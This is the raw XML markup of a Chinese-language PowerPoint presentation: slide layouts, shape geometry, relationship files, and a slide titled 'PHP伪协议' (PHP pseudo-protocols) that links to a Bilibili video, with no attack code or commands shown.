          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="14" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId23"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1304290" y="3888422"/>
            <a:ext cx="4359910" cy="505778"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="t" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="457200" marR="0" indent="-457200" algn="l" rtl="0" eaLnBrk="1" fontAlgn="auto">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="2000" b="0" spc="200">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>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dirty="0"/>
              <a:t>单击此处编辑副标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="13" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId24"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1215390" y="2562542"/>
            <a:ext cx="4359910" cy="1172210"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="4572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tx1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编辑标题</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152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="等腰三角形 8"/>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2" name="等腰三角形 11"/>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7"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669882" y="443230"/>
            <a:ext cx="10852237"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1" name="组合 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="12" name="等腰三角形 11"/>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6"/>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5" name="等腰三角形 14"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>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hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId8"/>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9"/>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0"/>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6" name="组合 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="11624102" y="104775"/>
            <a:ext cx="412698" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="412698" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="12" name="等腰三角形 11"/>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2" name="组合 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="等腰三角形 12"/>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6"/>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6" name="等腰三角形 15"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>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8"/>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2" name="组合 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="等腰三角形 12"/>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6"/>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6" name="等腰三角形 15"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>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8"/>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3"/>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6" name="组合 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="133780" y="6475254"/>
            <a:ext cx="11903288" cy="268446"/>
            <a:chOff x="133780" y="6475254"/>
            <a:chExt cx="11903288" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="等腰三角形 15"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11697762" y="6475254"/>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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId5"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11624370" y="6532404"/>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custDataLst>
                <p:tags r:id="rId6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="133780" y="6486209"/>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9" name="等腰三角形 18"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="176643" y="6526690"/>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p:custDataLst>
              <p:tags r:id="rId8"/>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4"/>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5"/>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3691"/>
            <a:ext cx="12192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7" name="组合 16"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="300038" y="5993606"/>
            <a:ext cx="11551293" cy="614362"/>
            <a:chOff x="300038" y="5993606"/>
            <a:chExt cx="11551293" cy="614362"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="12" name="等腰三角形 11"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11074800" y="5993606"/>
              <a:ext cx="776531" cy="614362"/>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a:off x="10906836" y="6124399"/>
              <a:ext cx="767429" cy="483569"/>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6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="300038" y="6024147"/>
              <a:ext cx="1021556" cy="570546"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 73825"/>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5" name="等腰三角形 14"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="397847" y="6116521"/>
              <a:ext cx="809631" cy="445568"/>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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId8"/>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217.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag216.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag215.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag214.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag213.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag212.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19.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag218.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide2.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9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag257.xml"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag256.xml"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag255.xml"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag254.xml"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag253.xml"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag252.xml"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag251.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag250.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag249.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag222.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag248.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag247.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag246.xml"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag245.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag244.xml"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag243.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag242.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag241.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag240.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag239.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag221.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag238.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag237.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag236.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag235.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag234.xml"/><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60.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag25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6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tags" Target="../tags/tag263.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><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tags" Target="../tags/tag26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tags" Target="../tags/tag283.xml"/><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 Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag312.xml"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag311.xml"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag310.xml"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag309.xml"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag308.xml"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag307.xml"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag306.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag305.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag304.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag277.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag303.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag302.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag301.xml"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag300.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag299.xml"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag298.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag297.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag296.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag295.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag294.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag276.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag293.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag292.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag291.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag290.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag289.xml"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag288.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag287.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag286.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag285.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag284.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag27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tags" Target="../tags/tag31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15.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag314.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide21.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag324.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag323.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag322.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag321.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag320.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag319.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag318.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag317.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag332.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag331.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag330.xml"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag329.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag328.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag327.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag326.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag325.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag3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3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9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag343.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag342.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag341.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag340.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag339.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag338.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag337.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag336.xml"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag347.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag346.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag345.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag344.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag33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4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4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1931321" y="2382126"/>
            <a:ext cx="3681438" cy="1854791"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="5700" b="1" spc="600">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>PHP伪协议</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="5700" b="1" spc="600">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="文本框 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703955" y="4123690"/>
            <a:ext cx="6096000" cy="1198880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>https://www.bilibili.com/video/BV1UW4y1M7qC/?spm_id_from=333.337.search-card.all.click&amp;vd_source=226c3c90e6ed3960281642698e60d64b</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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18" name="组合 17"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="20" name="等腰三角形 19"/>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8" name="等腰三角形 37"/>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9" name="等腰三角形 38"/>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sp>
          <p:nvSpPr>
            <p:cNvPr id="40" name="等腰三角形 39"/>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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="组合 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId6"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9115160" y="0"/>
            <a:ext cx="3083190" cy="4178868"/>
            <a:chOff x="9115160" y="0"/>
            <a:chExt cx="3083190" cy="4178868"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="5" name="直接连接符 4"/>
            <p:cNvCxnSpPr/>
            <p:nvPr>
              <p:custDataLst>
                <p:tags r:id="rId7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1193025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8"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1166214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9"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1152809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0"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1125999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11"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1099188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2"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="911516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3"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="965136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4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1018757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5"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="924921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16"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="991947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7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1045568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8"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1072378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9"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1219835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0"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1206430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21"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1179620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22"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1139404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23"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1112594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24"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="938326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25"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="978542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26"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1032162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27"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="951731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28"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1005352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29"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1058973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30"/>
